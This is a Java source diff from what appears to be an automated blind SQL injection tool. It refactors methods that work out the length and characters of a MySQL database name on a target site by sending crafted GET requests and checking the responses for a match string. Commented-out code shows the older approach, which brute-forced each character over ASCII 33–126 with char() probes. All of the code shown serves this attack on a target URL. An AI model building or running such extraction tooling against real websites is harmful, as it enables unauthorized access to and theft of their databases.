@@ -50,34 +50,49 @@ public class ResultResolver {
 		return cnt;
 	}
 	
-	/*
-	public int getDBNameLength(String targetURL, String match,int targetDBIndex, int until, String targetParam){
-		int cnt = 0;
-		for(int i=0; i < until; i++){
-			// STEP 1. 요청 URL 생성
-			QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.LENGTH);
-			cond.setCheckVal(i+"");
-			cond.setDbIndex(targetDBIndex);
-			String query = qm.getQuery(cond);
-			String URL = urlMaker.getURL(targetURL, targetParam, query);
-			//System.out.println(URL);
-			// STEP 2. URL 요청 및 결과 확인
-			String res = urlResolver.sendGet(URL);
-			if(decider.isSuccess(res, match)){
-				cnt = i;
-				break;
-			}
-		}
-		return cnt;
+	
+	public int getDBNameLength(String targetURL, String match,int targetDBIndex, int until, String targetParam, String targetParamVal){
+		int length = 0;
+		QueryCondition qc = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.LENGTH);
+		qc.setDbIndex(targetDBIndex);
+		
+		URLCondition uc = new URLCondition();
+		uc.setDomain(targetURL);
+		uc.setHttpQueryType(HttpQueryType.GET_QUERY_ON_PARAM);
+		uc.setParamName(targetParam);
+		uc.setParamValue(targetParamVal);
+		
+		UserValueCondition cond = new UserValueCondition();
+		cond.setLengthUntil(until);
+		cond.setMatch(match);
+		
+		length = helper.getLength(qc, uc, cond);
+		return length;
 	}
 	
-	public String getDBName(String targetURL, String match, int targetDBIndex, int targetDBLength, String targetParam){
+	public String getDBName(String targetURL, String match, int targetDBIndex, int targetDBNameLength, String targetParam, String targetParamVal){
 		// 여기서부터는 이중 for 문이 필요 (i: DB이름의 index, 시도하고자 하는 문자의 index)
 		String dbName = "";
-		for(int i=0; i < targetDBLength ; i++){
+		QueryCondition qc = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.CONTENT);
+		qc.setDbIndex(targetDBIndex);
+		
+		URLCondition uc = new URLCondition();
+		uc.setDomain(targetURL);
+		uc.setHttpQueryType(HttpQueryType.GET_QUERY_ON_PARAM);
+		uc.setParamName(targetParam);
+		uc.setParamValue(targetParamVal);
+		
+		UserValueCondition cond = new UserValueCondition();
+		cond.setMatch(match);
+		
+		dbName = helper.getContent(qc, uc, cond, targetDBNameLength);
+		/*
+		for(int i=0; i < targetDBNameLength ; i++){
+			qc.setDbNameIndex(i);
+		}*/
+		/*
 			for(int j=33; j < 127; j++){ //(아스키 33~126까지 찾기)
 				// STEP 1. 요청 URL 생성
-				QueryCondition cond = new QueryCondition(DbmsType.MY_SQL, TargetType.DB_SCHEMA, QueryType.CONTENT);
 				cond.setCheckVal("char("+j+")");
 				cond.setDbIndex(targetDBIndex);
 				cond.setDbNameIndex(i+1);
@@ -94,9 +109,9 @@ public class ResultResolver {
 					break;
 				}
 			}
-		}
+		}*/
+		
 		return dbName;
 	}
-	*/
 	
 }
